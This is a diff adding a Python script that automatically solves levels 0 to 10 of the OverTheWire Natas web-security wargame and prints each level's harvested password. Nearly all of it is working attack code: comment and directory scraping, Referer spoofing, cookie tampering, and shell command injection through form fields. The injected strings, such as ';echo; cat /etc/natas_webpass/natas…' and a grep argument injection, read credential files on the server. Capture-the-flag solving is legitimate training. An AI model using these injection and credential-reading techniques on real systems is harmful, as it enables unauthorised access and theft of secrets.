@@ -1,0 +1,534 @@
+import requests
+import re
+import base64
+
+passwords = ['Placeholder']
+levels = [f'natas{lvl}' for lvl in range(0,12)]
+local_pw = '/etc/natas_webpass/natas'
+
+class NATAS0:
+	#Create a function to retrieve contents from the target HTML
+	@staticmethod
+	def grabcontent():
+		response = requests.get('http://natas0.natas.labs.overthewire.org/', auth=(levels[0], levels[0]))
+		#Create a variable that contains HTML content
+		content = response.text
+		#Storage for found comments within HTML content
+		comments = []
+
+		# Split the content into lines
+		for line in content.splitlines():
+			# Check if the line contains HTML comments
+			if '<!--' in line or '-->' in line:
+				#Add found comment to comments storage
+				comments.append(line)
+		NATAS0.gatherpass(comments)
+
+		return comments  # Return comments so they can be accessed later
+	#Create a function to print found comments neatly
+	@staticmethod
+	def dropcomments(comments):
+		#Prints each entry in comments storage
+		for x in range(len(comments)):
+			print(f'Comment #{x}:\n{comments[x]}')
+	@staticmethod
+	def gatherpass(comments):
+		for x in range(len(comments)):
+			elements = comments[x].split(' ')
+			for x in range(len(elements)):
+				if len(elements[x]) == 32:
+					passwords.append(elements[x])
+
+class NATAS1:
+	#Create a function to retrieve contents from the target HTML
+	@staticmethod
+	def grabcontent():
+		response = requests.get('http://natas1.natas.labs.overthewire.org/', auth=(levels[1], passwords[1]))
+		#Create a variable that contains HTML content
+		content = response.text
+		#Storage for found comments within HTML content
+		comments = []
+
+		# Split the content into lines
+		for line in content.splitlines():
+			# Check if the line contains HTML comments
+			if '<!--' in line or '-->' in line:
+				#Add found comment to comments storage
+				comments.append(line)
+		NATAS1.gatherpass(comments)
+		return comments  # Return comments so they can be accessed later
+	#Create a function to print found comments neatly
+
+	@staticmethod
+	def dropcomments(comments):
+		#Prints each entry in comments storage
+		for x in range(len(comments)):
+			print(f'Comment #{x}:\n{comments[x]}')
+	@staticmethod
+	def gatherpass(comments):
+		for x in range(len(comments)):
+			elements = comments[x].split(' ')
+			for x in range(len(elements)):
+				if len(elements[x]) == 32:
+					passwords.append(elements[x])
+					
+
+class NATAS2:
+	@staticmethod
+	def grabcontent():
+		auth = (levels[2], passwords[2])  # Predefining auth for many requests
+		url = 'http://natas2.natas.labs.overthewire.org/'
+		response = requests.get(url, auth=auth)
+		content = response.text
+        
+		for line in content.splitlines():
+			# Locate where files are held on the server
+			if 'img' in line and '.png' in line:
+				imgpath = line.split('"')
+				filedir = imgpath[1].split('/')[0]  # Get the directory part
+                
+				# Request the directory to get file references
+				response = requests.get(url + filedir + '/', auth=auth)
+
+                # Create list of hypertext references
+				references = []
+				for line in response.text.splitlines():
+					parts = line.split('href="')  # Locate hrefs in element tags
+					for part in parts[1:]:  # Skip the first element
+						href_val = part.split('"')[0]  # Take the first part of the element
+						references.append(href_val)  # Add each href value to the list
+                
+				# Create list for files held within a given folder
+				files = []
+				for ref in references:
+					if '.' in ref:  # Locate files and not URI locations
+						files.append(ref)  # Add locations to the references list
+
+				# For each file authenticate and seek credentials
+				NATAS2.gatherpass(files, auth, filedir)
+
+	@staticmethod
+	def gatherpass(files, auth, filedir):
+		for file in files:
+			try:
+				# Construct the full URL correctly using the directory
+				full_url = f'http://natas2.natas.labs.overthewire.org/{filedir}/{file}'
+				response = requests.get(full_url, auth=auth)
+
+				# Check if the response was successful
+				if response.status_code == 200:
+                    
+					# Look for passwords
+					data = response.text.split(':')  # Splits username and passwords apart
+					for entry in data:
+						pwset = entry.split('\n')  # Splits username and passwords up the rest of the way
+						if len(pwset[0]) == 32:  # Check for password length
+							passwords.append(pwset[0])  # Add found password to passwords list
+			finally:
+				pass
+
+class NATAS3:
+	#Create a function to retrieve contents from the target HTML
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas3.natas.labs.overthewire.org/'#Predefining url because many requests will be made
+		auth = (levels[3], passwords[3])#Predefining auth because many requests will be made
+		response = requests.get(url, auth=auth)
+		#Create a variable that contains HTML content
+		content = response.text
+		if 'Google' in content:#Locate "Google" in the HTML comments, this indicates presence of robots.txt
+				response = requests.get('http://natas3.natas.labs.overthewire.org/robots.txt', auth=auth)
+				dir = response.text.split('\n')
+				dirs = []
+				references = []
+				files = []
+				for x in range(len(dir)):
+					if '/' in dir[x]:
+						dirs.append(dir[x].split()[0:2][1])
+				for x in range(len(dirs)):
+					response = requests.get(url + dirs[x], auth=auth)
+					for line in response.text.splitlines():
+						parts = line.split('href="')
+						for part in parts[1:]:
+							href_val = part.split('"')[0]
+							references.append(href_val)
+					for ref in references:
+						if '.' in ref:
+							files.append(ref)
+		NATAS3.gatherpass(files, auth, url, dirs)
+	@staticmethod
+	def gatherpass(files, auth, url, dirs):
+		for x in range(len(files)):
+			for y in range(len(dirs)):
+				response = requests.get(url + dirs[y] + files[x], auth=auth)
+				if ':' in response.text:
+					pwset = response.text.split(':')[1:][0].strip('\n')
+					if len(pwset) == 32:
+						passwords.append(pwset)
+						
+class NATAS4:
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas4.natas.labs.overthewire.org/'
+		auth = (levels[4], passwords[4])
+		response = requests.get(url, auth=auth)
+		headers = {}
+		for line in response.text.splitlines():
+			if 'Access disallowed' in line:
+				parts = line.split('"')
+				for x in range(len(parts)):
+					if 'http' in parts[x]:
+						headers['Referer'] = parts[x]
+		NATAS4.gatherpass(url, auth, headers)
+		
+	@staticmethod
+	def gatherpass(url, auth, headers):
+		response = requests.get(url, auth=auth, headers=headers)
+		for line in response.text.splitlines():
+			if 'password' in line:
+				part = line.split(' ')
+				for x in range(len(part)):
+					if len(part[x]) == 32:
+						passwords.append(part[x])
+
+class NATAS5:
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas5.natas.labs.overthewire.org/'
+		auth = (levels[5], passwords[5])
+		session = requests.Session()
+		lr = session.post(url, auth=auth)
+		cookies = session.cookies
+		session.close()
+		NATAS5.gatherpass(url, auth, cookies, session)
+
+	@staticmethod
+	def gatherpass(url, auth, cookies, session):
+		session = requests.Session()
+		for cookie in cookies:
+			if str(cookie.value).isdigit():
+				if cookie.value == '0':
+					session.cookies.set(cookie.name, '1')
+		
+		response = session.get(url, auth=auth)
+		session.close()
+		for line in response.text.splitlines():
+			if 'password' in line:
+				part = line.split(' ')
+				for x in range(len(part)):
+					part[x] = part[x].split('<')
+					if len(part[x][0]) == 32:
+						passwords.append(part[x][0])
+
+class NATAS6:
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas6.natas.labs.overthewire.org/'
+		auth = (levels[6], passwords[6])
+		response = requests.get(url, auth=auth)
+		hrefs = []
+		files = []
+		parts = []
+		for line in response.text.splitlines():
+			try:
+				if 'href="' in line and '.css' not in line:
+					part = line.split('href="')
+					for x in range(len(part)):
+						if '.' in part[x]:
+							hrefs.append(part[x].split('"')[0])
+			finally:
+				pass
+		for x in range(len(hrefs)):
+			response = requests.get(url + hrefs[x], auth=auth)
+		pattern = r'&lt;\?(.*?)\?&gt;'
+		match = re.search(pattern, response.text, re.DOTALL)
+		if match:
+			code = match.group(1).strip()
+		parse = code.split('"')
+		for x in range(len(parse)):
+			if '.' in parse[x] and '/' in parse[x]:
+				files.append(parse[x])
+		for x in range(len(files)):
+			response = requests.get(url + files[x], auth=auth)
+		for line in response.text.splitlines():
+			if '=' in line:
+				part = line.split('"')
+				for piece in part:
+					parts.append(piece)
+		payload = []
+		for x in range(len(parts)):
+			if parts[x] == ';':
+				payload.append(parts[x -1])
+		NATAS6.gatherpass(url, auth, payload)
+	
+	@staticmethod
+	def gatherpass(url, auth, payload):
+		formcode = []
+		forms = []
+		pattern = '<form.*?>(.*?)</form>'
+		response = requests.get(url, auth=auth)
+		matches = re.findall(pattern, response.text, re.DOTALL)
+		for match in matches:
+			formcode.extend(match.splitlines())
+		for x in range(len(formcode)):
+			if 'name' in formcode[x] and 'type' not in formcode[x]:
+				forms.append(formcode[x])
+		pattern = r'name=["\']?(.*?)(?=["\']?\s*>)'
+		matches = re.findall(pattern, min(forms))
+		formname = min(matches)
+		data = {
+		formname: payload,
+		'submit': 'Submit'
+		}
+		response = requests.post(url, data=data, auth=auth)
+		for line in response.text.splitlines():
+			if 'password' in line:
+				part = line.split(' ')
+				for x in range(len(part)):
+					if len(part[x]) == 32:
+						passwords.append(part[x])
+						
+class NATAS7:
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas7.natas.labs.overthewire.org/'
+		auth = (levels[7], passwords[7])
+		response = requests.get(url, auth=auth)
+		executed = False
+		filedir = []
+		pageref = []
+		
+		for line in response.text.splitlines():
+			if '<!--' and 'password' in line:
+				idxstart = line.find('/')
+				if idxstart != -1:
+					part = line[idxstart:].split()
+					filedir.append(part[0])
+			elif '.php' in line and not executed:
+				idxstart = line.find('?')
+				if idxstart != -1:
+					part = line[idxstart:].split()
+					pageref.append(part[0].split('"')[0].split('=')[0] + '=')
+					executed = True
+			else:
+				pass
+		NATAS7.gatherpass(url, auth, pageref, filedir)
+		
+	@staticmethod
+	def gatherpass(url, auth, pageref, filedir):
+		response = requests.get(url + pageref[0] + filedir[0], auth=auth)
+		for line in response.text.splitlines():
+			if len(line) == 32:
+				passwords.append(line)
+class NATAS8:
+	@staticmethod
+	def grabcontent():
+		url = 'http://natas8.natas.labs.overthewire.org/'
+		auth = (levels[8], passwords[8])
+		response = requests.get(url, auth=auth)
+		hrefs = []
+		files = []
+		parts = []
+		for line in response.text.splitlines():
+			try:
+				if 'href="' in line and '.css' not in line:
+					part = line.split('href="')
+					for x in range(len(part)):
+						if '.' in part[x]:
+							hrefs.append(part[x].split('"')[0])
+			finally:
+				pass
+		for x in range(len(hrefs)):
+			response = requests.get(url + hrefs[x], auth=auth)
+		pattern = r'&lt;\?(.*?)\?&gt;'
+		match = re.search(pattern, response.text, re.DOTALL)
+		if match:
+			code = match.group(1).strip()
+		parse = code.split('"')
+		for x in range(len(parse)):
+			if '.' in parse[x] and '/' in parse[x]:
+				files.append(parse[x])
+		for x in range(len(files)):
+			response = requests.get(url + files[x], auth=auth)
+		for line in response.text.splitlines():
+			if '=' in line:
+				part = line.split('"')
+				for piece in part:
+					parts.append(piece)
+		payload = []
+		for x in range(len(parts)):
+			if len(parts[x]) == 32 and ' ' not in parts[x]:
+				payload.append(parts[x])
+		NATAS8.gatherpass(url, auth, payload)
+	
+	@staticmethod
+	def gatherpass(url, auth, payload):
+		decodehex = bytes.fromhex(payload[0]).decode('utf-8', errors='replace')[::-1]#decode the hex and reverse the output.
+		payload = base64.b64decode(decodehex).decode('utf-8', errors='replace')#decode the b64 payload
+		formcode = []
+		forms = []
+		pattern = '<form.*?>(.*?)</form>'
+		response = requests.get(url, auth=auth)
+		matches = re.findall(pattern, response.text, re.DOTALL)
+		for match in matches:
+			formcode.extend(match.splitlines())
+		for x in range(len(formcode)):
+			if 'name' in formcode[x] and 'type' not in formcode[x]:
+				forms.append(formcode[x])
+		pattern = r'name=["\']?(.*?)(?=["\']?\s*>)'
+		matches = re.findall(pattern, min(forms))
+		formname = min(matches)
+		data = {
+		formname: payload,
+		'submit': 'Submit'
+		}
+		response = requests.post(url, data=data, auth=auth)
+		for line in response.text.splitlines():
+			if 'password' in line:
+				part = line.split(' ')
+				for x in range(len(part)):
+					if len(part[x]) == 32:
+						passwords.append(part[x])
+
+class NATAS9:
+	@staticmethod
+	def grabcontent():
+		formcode = []
+		forms = []
+		url = 'http://natas9.natas.labs.overthewire.org/'
+		auth = (levels[9], passwords[9])
+		response = requests.get(url, auth=auth)
+		#start here
+		form_pattern = r'<form>(.*?)</form>'
+		form_content = re.search(form_pattern, response.text, re.DOTALL)
+		
+		if form_content:
+			form_data = form_content.group(1)
+			
+			input_pattern = r'<input\s+([^>]*?)>'
+			inputs = re.findall(input_pattern, form_data)
+			
+			names = []
+			types = []
+			values = []
+			
+			for input_tag in inputs:
+				name_match = re.search(r'name=["\']?([^"\'>]+)["\']?', input_tag)
+				if name_match:
+					names.append(name_match.group(1))
+					
+				type_match = re.search(r'type=["\']?([^"\'>]+)["\']?', input_tag)
+				if type_match:
+					types.append(type_match.group(1))
+				
+				value_match = re.search(r'value=["\']?([^"\'>]*)["\']?', input_tag)
+				if value_match:
+					values.append(value_match.group(1))
+
+		NATAS9.gatherpass(url, auth, names, types)
+		
+	def gatherpass(url, auth, names, types):
+		payload = f';echo; cat {local_pw}{str(len(passwords))};'
+		data = {}
+		data[names[0]] = payload
+		#submit_name = 
+		data[types[0].split('=')[1].split(' ')[0]] = types[0].split('=')[2]
+		response = requests.post(url, data=data, auth=auth)
+		init_cmdrsp = r'<pre>(.*?)</pre>'
+		cmdrsp = re.search(init_cmdrsp, response.text, re.DOTALL).group(1)
+		for line in cmdrsp.splitlines():
+			if len(line) == 32:
+				passwords.append(cmdrsp.split('\n')[2])
+
+class NATAS10:
+	@staticmethod
+	def grabcontent():
+		formcode = []
+		forms = []
+		url = 'http://natas10.natas.labs.overthewire.org/'
+		auth = (levels[10], passwords[10])
+		response = requests.get(url, auth=auth)
+		#start here
+		form_pattern = r'<form>(.*?)</form>'
+		form_content = re.search(form_pattern, response.text, re.DOTALL)
+		if form_content:
+			form_data = form_content.group(1)
+			
+			input_pattern = r'<input\s+([^>]*?)>'
+			inputs = re.findall(input_pattern, form_data)
+			names = []
+			types = []
+			values = []
+			
+			for input_tag in inputs:
+				name_match = re.search(r'name=["\']?([^"\'>]+)["\']?', input_tag)
+				if name_match:
+					names.append(name_match.group(1))
+					
+				type_match = re.search(r'type=["\']?([^"\'>]+)["\']?', input_tag)
+				if type_match:
+					types.append(type_match.group(1))
+				
+				value_match = re.search(r'value=["\']?([^"\'>]*)["\']?', input_tag)
+				if value_match:
+					values.append(value_match.group(1))
+
+		NATAS10.gatherpass(url, auth, names, types)
+		
+	def gatherpass(url, auth, names, types):
+		payload = f'-E "[0-9][A-Za-z]" {local_pw}{str(len(passwords))}'
+		data = {}
+		data[names[0]] = payload
+		#submit_name = 
+		data[types[0].split('=')[1].split(' ')[0]] = types[0].split('=')[2]
+		response = requests.post(url, data=data, auth=auth)
+		init_cmdrsp = r'<pre>(.*?)</pre>'
+		cmdrsp = re.search(init_cmdrsp, response.text, re.DOTALL).group(1)
+		for line in cmdrsp.splitlines():
+			if ':' in line:
+				part = line.split(':')[1]
+				if len(part) == 32:
+					passwords.append(part)
+
+#Level 0
+NATAS0.grabcontent()
+
+#Level 1
+NATAS1.grabcontent()
+
+#Level 2
+NATAS2.grabcontent()
+
+#Level 3
+NATAS3.grabcontent()
+
+#Level 4
+NATAS4.grabcontent()
+
+#Level 5
+NATAS5.grabcontent()
+
+#Level 6
+NATAS6.grabcontent()
+
+#Level 7
+NATAS7.grabcontent()
+
+#Level 8
+NATAS8.grabcontent()
+
+#Level 9
+NATAS9.grabcontent()
+
+#Level 10
+NATAS10.grabcontent()
+
+try:
+	print()
+	for x in range(len(passwords)):
+		if passwords[x] == 'Placeholder':
+			print(passwords[x].replace('Placeholder', '(NATAS0)	Password: -------N/A // Entry Level-------'))
+		else:
+			print(f'(NATAS{str(x)})	Password: {passwords[x]}')
+finally:
+	print()
